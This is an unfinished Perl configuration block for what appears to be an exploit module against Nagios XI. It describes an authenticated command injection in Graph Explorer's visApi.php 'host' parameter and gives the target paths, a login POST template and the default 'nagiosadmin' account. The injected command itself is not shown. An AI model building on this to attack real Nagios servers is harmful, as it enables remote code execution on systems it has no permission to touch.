my $EXPLOIT = {
  "DESCRIPTION" => "

          This module exploits a vulnerability found in Nagios XI Network Monitor's

        component 'Graph Explorer'.  An authenticated user can execute system commands

        by injecting it in several parameters, such as in visApi.php's 'host' parameter,

        which results in remote code execution.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "nagios_graph_explorer",
  "OSVDB" => 83552,
  "PATH" => "nagiosxi/login.php?",
  "PATHS" => ["nagiosxi/index.php", "nagiosxi/login.php"],
  "PAYLOAD" => "nsp=__NSP__&page=auth&debug=&pageopt=login&username=__USERNAME__&password=__PASSWORD__&loginButton=Login&",
  "THE USERTITLE TO LOGIN AS" => "nagiosadmin",
  VARIABLES => {
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'COOKIE' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'NSP' =>       { DESCRIPTION => "", VALUE => "" },
    'RHOST' =>       { DESCRIPTION => "", VALUE => "" },
  },
